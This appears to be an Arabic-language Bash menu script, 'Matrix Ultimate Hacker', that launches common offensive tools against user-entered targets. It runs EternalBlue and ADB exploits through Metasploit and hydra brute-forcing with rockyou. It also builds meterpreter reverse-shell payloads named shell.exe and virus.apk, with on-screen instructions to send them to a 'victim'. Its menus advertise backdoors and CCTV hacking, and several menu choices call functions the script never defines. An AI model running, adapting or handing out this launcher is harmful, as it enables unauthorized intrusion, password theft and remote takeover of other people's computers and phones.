#!/bin/bash
# -*- coding: utf-8 -*-
# Matrix Ultimate Hacker v6.0
# نظام متكامل لأدوات الاختراق الأخلاقي
# المطور: سايبر قارديان
# نظام التشغيل: كالي لينكس 2024

# ===== [ إعدادات النظام ] =====
function تهيئة_النظام() {
  clear
  echo -e "\e[1;32m"
  cat << "EOF"

  ███╗   ███╗ █████╗ ████████╗██████╗ ██╗██╗  ██╗    ██╗   ██╗██╗  ██╗██████╗ ██╗   ██╗
  ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██║╚██╗██╔╝    ██║   ██║██║  ██║██╔══██╗╚██╗ ██╔╝
  ██╔████╔██║███████║   ██║   ██████╔╝██║ ╚███╔╝     ██║   ██║███████║██████╔╝ ╚████╔╝ 
  ██║╚██╔╝██║██╔══██║   ██║   ██╔══██╗██║ ██╔██╗     ██║   ██║██╔══██║██╔══██╗  ╚██╔╝  
  ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║██║██╔╝ ██╗    ╚██████╔╝██║  ██║██████╔╝   ██║   
  ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═════╝    ╚═╝   
EOF
  echo -e "\e[36m"
  echo "▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂"
  echo -e "\e[1;37mالإصدار: \e[35m6.0 \e[0m|\e[1;37m المستخدم: \e[35m$(whoami)"
  echo -e "\e[1;37mالأدوات النشطة: \e[35m0 \e[0m|\e[1;37m الجلسات: \e[35m0"
  echo -e "\e[1;37مصادر الثغرات: \e[32mمحدثة\e[0m |\e[1;37م التخفي: \e[31mغير مفعل\e[0m"
  echo -e "\e[36m▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂\e[0m"
}

# ===== [ القائمة الرئيسية ] =====
function القائمة_الرئيسية() {
  تهيئة_النظام
  echo -e "\n\e[1;33m[ القائمة الرئيسية - اختر التصنيف ]\e[0m"
  echo " 1.  جمع المعلومات (15 أداة)"
  echo " 2.  تحليل الثغرات (12 أداة)"
  echo " 3.  اختراق الشبكات اللاسلكية (10 أدوات)"
  echo " 4.  اختراق تطبيقات الويب (18 أداة)"
  echo " 5.  هجمات كلمات المرور (14 أداة)"
  echo " 6.  أدوات الاستغلال (16 أداة)"
  echo " 7.  الهندسة الاجتماعية (8 أدوات)"
  echo " 8.  التخفي والتجسس (9 أدوات)"
  echo " 9.  ما بعد الاختراق (7 أدوات)"
  echo "10.  الأدوات الجنائية (6 أدوات)"
  echo "11.  الاختراق المتقدم (12 أداة)"
  echo -e "\e[1;31m 0.  الخروج من النظام\e[0m"
  echo -ne "\e[1;34m\nماتريكس>\e[0m "
  read اختيار

  case $اختيار in
    1) قائمة_جمع_المعلومات;;
    2) قائمة_تحليل_الثغرات;;
    4) قائمة_اختراق_الويب;;
    5) قائمة_هجمات_كلمات_المرور;;
    6) قائمة_أدوات_الاستغلال;;
    11) قائمة_الاختراق_المتقدم;;
    0) الخروج;;
    *) القائمة_الرئيسية;;
  esac
}

# ===== [ قائمة جمع المعلومات ] =====
function قائمة_جمع_المعلومات() {
  تهيئة_النظام
  echo -e "\n\e[1;33m[ أدوات جمع المعلومات ]\e[0m"
  echo " 1.  مسح الشبكة (nmap)"
  echo "    ➤ مسح الأجهزة المتصلة بالشبكة والتعرف على المنافذ المفتوحة"
  echo " 2.  حصاد البريد (theHarvester)"
  echo "    ➤ جمع عناوين البريد الإلكتروني وأسماء النطاقات من مصادر عامة"
  echo " 3.  استكشاف DNS (dnsenum)"
  echo "    ➤ تعداد سجلات DNS ونطاقات فرعية"
  echo " 4.  مسح الشبكة اللاسلكية (airodump-ng)"
  echo "    ➤ كشف الشبكات اللاسلكية والأجهزة المتصلة"
  echo " 5.  استخلاص البيانات (metagoofil)"
  echo "    ➤ استخراج البيانات الوصفية من المستندات العامة"
  echo " 6.  تتبع الشبكة (traceroute)"
  echo "    ➤ تتبع مسار الحزم عبر الشبكة"
  echo -ne "\e[1;34m\nماتريكس/المعلومات>\e[0m "
  read اختيار

  case $اختيار in
    1)
      echo -e "\e[36m[➤] تشغيل nmap - أدخل نطاق IP (مثال: 192.168.1.0/24):\e[0m"
      read ip_range
      nmap -sn $ip_range
      ;;
    2)
      echo -e "\e[36m[➤] تشغيل theHarvester - أدخل النطاق (مثال: example.com):\e[0m"
      read domain
      theHarvester -d $domain -b all
      ;;
    4)
      echo -e "\e[36m[➤] تشغيل airodump-ng - اختر الواجهة اللاسلكية (مثال: wlan0):\e[0m"
      read interface
      sudo airodump-ng $interface
      ;;
  esac
}

# ===== [ قائمة اختراق الويب ] =====
function قائمة_اختراق_الويب() {
  تهيئة_النظام
  echo -e "\n\e[1;33m[ أدوات اختراق تطبيقات الويب ]\e[0m"
  echo " 1.  مسح الثغرات (nikto)"
  echo "    ➤ كشف الثغرات الأمنية في خوادم الويب"
  echo " 2.  حقن SQL (sqlmap)"
  echo "    ➤ اكتشاف واستغلال ثغرات SQL Injection"
  echo " 3.  تخطي أنظمة الحماية (bypass-waf)"
  echo "    ➤ تجاوز جدران حماية تطبيقات الويب"
  echo " 4.  مسح XSS (XSStrike)"
  echo "    ➤ كشف ثغرات Cross-Site Scripting"
  echo " 5.  اختبار SSL (testssl.sh)"
  echo "    ➤ تحليل شهادات SSL/TLS"
  echo -ne "\e[1;34m\nماتريكس/الويب>\e[0m "
  read اختيار

  case $اختيار in
    1)
      echo -e "\e[36m[➤] تشغيل nikto - أدخل عنوان URL (مثال: https://example.com):\e[0m"
      read url
      nikto -h $url
      ;;
    2)
      echo -e "\e[36m[➤] تشغيل sqlmap - أدخل عنوان URL (مثال: https://test.com/vuln.php?id=1):\e[0m"
      read url
      sqlmap -u $url --dbs
      ;;
    3)
      echo -e "\e[36m[➤] تشغيل bypass-waf - أدخل عنوان URL المستهدف:\e[0m"
      read url
      python3 bypass-waf.py -u $url
      ;;
  esac
}

# ===== [ قائمة هجمات كلمات المرور ] =====
function قائمة_هجمات_كلمات_المرور() {
  تهيئة_النظام
  echo -e "\n\e[1;33m[ أدوات كسر كلمات المرور ]\e[0m"
  echo " 1.  هجوم القوة الغاشمة (hydra)"
  echo "    ➤ اختبار كلمات المرور على خدمات الشبكة"
  echo " 2.  كسر التجزئات (hashcat)"
  echo "    ➤ فك تشفير التجزئات باستخدام وحدة GPU"
  echo " 3.  هجوم القاموس (john)"
  echo "    ➤ كسر كلمات المرور باستخدام قوائم الكلمات"
  echo " 4.  هجوم السحابة (Hashcrack)"
  echo "    ➤ استخدام موارد سحابية لكسر التشفير"
  echo -ne "\e[1;34m\nماتريكس/كلمات-المرور>\e[0m "
  read اختيار

  case $اختيار in
    1)
      echo -e "\e[36m[➤] تشغيل hydra - أدخل اسم المستخدم (أو قائمة مستخدمين):\e[0m"
      read username
      echo -e "\e[36m[➤] أدخل عنوان IP الهدف:\e[0m"
      read target_ip
      echo -e "\e[36m[➤] أدخل اسم الخدمة (ssh, ftp, http-post):\e[0m"
      read service
      hydra -l $username -P /usr/share/wordlists/rockyou.txt $target_ip $service
      ;;
    2)
      echo -e "\e[36m[➤] تشغيل hashcat - أدخل نوع التجزئة (مثال: 1000 = NTLM):\e[0m"
      read hash_type
      echo -e "\e[36m[➤] أدخل ملف التجزئة:\e[0m"
      read hash_file
      hashcat -m $hash_type $hash_file /usr/share/wordlists/rockyou.txt
      ;;
  esac
}

# ===== [ قائمة الاختراق المتقدم ] =====
function قائمة_الاختراق_المتقدم() {
  تهيئة_النظام
  echo -e "\n\e[1;33m[ أدوات الاختراق المتقدم ]\e[0m"
  echo " 1.  استغلال تلقائي (metasploit)"
  echo "    ➤ نظام استغلال آلي للحصول على صلاحيات"
  echo " 2.  حصول على شل فوري (reverse-shell)"
  echo "    ➤ إنشاء حمولة للحصول على shell عكسي"
  echo " 3.  تثبيت باكدور (persistence)"
  echo "    ➤ تثبيت أبواب خلفية للوصول الدائم"
  echo " 4.  اختراق الهواتف (android-exploit)"
  echo "    ➤ استغلال ثغرات في أنظمة أندرويد"
  echo " 5.  اختراق كاميرات المراقبة (cctv-hack)"
  echo "    ➤ الوصول إلى كاميرات غير مؤمنة"
  echo -ne "\e[1;34m\nماتريكس/متقدم>\e[0m "
  read اختيار

  case $اختيار in
    1)
      echo -e "\e[36m[➤] تشغيل metasploit - أدخل عنوان IP الهدف:\e[0m"
      read target_ip
      echo -e "\e[36m[➤] أدخل نظام التشغيل (windows/linux/android):\e[0m"
      read os_type
      
      if [[ $os_type == "windows" ]]; then
        msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target_ip; exploit"
      elif [[ $os_type == "android" ]]; then
        msfconsole -q -x "use exploit/android/adb/adb_server_exec; set RHOST $target_ip; exploit"
      else
        msfconsole -q -x "use exploit/linux/local/service_persistence; set SESSION 1; exploit"
      fi
      ;;
    2)
      echo -e "\e[36m[➤] إنشاء حمولة shell عكسي - أدخل عنوان IP الخاص بك:\e[0m"
      read my_ip
      echo -e "\e[36m[➤] اختر نوع الحمولة (windows/linux/android):\e[0m"
      read payload_type
      
      if [[ $payload_type == "windows" ]]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$my_ip LPORT=4444 -f exe > shell.exe
        echo -e "\e[32m[✓] تم إنشاء shell.exe - أرسل الملف للضحية وشغله"
      elif [[ $payload_type == "android" ]]; then
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$my_ip LPORT=4444 R > virus.apk
        echo -e "\e[32m[✓] تم إنشاء virus.apk - أرسل التطبيق للضحية"
      fi
      
      echo -e "\e[36m[➤] تشغيل المستمع في نافذة جديدة..."
      gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ${payload_type}/meterpreter/reverse_tcp; set LHOST $my_ip; set LPORT 4444; exploit"
      ;;
  esac
}

# ===== [ نظام الخروج ] =====
function الخروج() {
  echo -e "\e[1;31m\n»»» تم إغلاق نظام الماتريكس... إلى اللقاء!\e[0m"
  exit 0
}

# ===== [ بدء النظام ] =====
تهيئة_النظام
القائمة_الرئيسية
